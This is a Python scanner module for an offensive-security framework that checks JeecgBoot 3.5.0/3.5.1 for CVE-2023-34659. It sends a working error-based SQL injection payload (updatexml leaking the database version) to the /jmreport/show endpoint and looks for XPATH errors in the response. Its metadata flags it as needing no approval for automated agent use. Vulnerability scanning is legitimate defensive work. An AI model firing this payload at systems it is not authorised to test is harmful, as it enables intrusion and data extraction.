#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""jeecg-boot 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'JeecgBoot 3.5.0 - SQL Injection Detection',
        'description': 'jeecg-boot 3.5.0 and 3.5.1 have a SQL injection vulnerability the id parameter of the /jeecg-boot/jmreport/show interface.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'jeecg', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/jeecgboot/jeecg-boot/issues/4976',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-34659',
            'https://github.com/izj007/wechat',
        ],
        'cve': 'CVE-2023-34659',
    }

    def run(self):
        path = '/jeecg-boot/jmreport/show'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json;charset=UTF-8'}, data='{"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{"id":"1\' or \'%1%\' like (updatexml(0x3a,concat(1,(version())),1)) or \'%%\' like \'"}"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('XPATH syntax error:', 'SQLException',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='JeecgBoot 3.5.0 - SQL Injection detected', path=path)
            return True
        return False

